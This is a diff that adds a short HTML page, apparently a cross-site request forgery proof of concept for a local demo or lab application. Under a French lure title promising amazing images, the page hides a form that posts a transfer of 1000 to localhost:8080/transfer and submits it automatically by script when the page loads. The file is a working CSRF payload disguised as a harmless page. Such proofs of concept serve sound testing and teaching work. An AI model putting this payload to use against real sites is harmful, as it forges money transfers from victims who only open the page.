@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Des Images Incroyables !</title>
+</head>
+<body>
+    <h1>Bienvenue !</h1>
+    <p>Profitez de ce moment de détente...</p>
+    
+    <form id="csrf-form" action="http://localhost:8080/transfer" method="post">
+        <input type="hidden" name="amount" value="1000">
+    </form>
+
+    <script>
+        document.getElementById("csrf-form").submit();
+    </script>
+</body>
+</html>
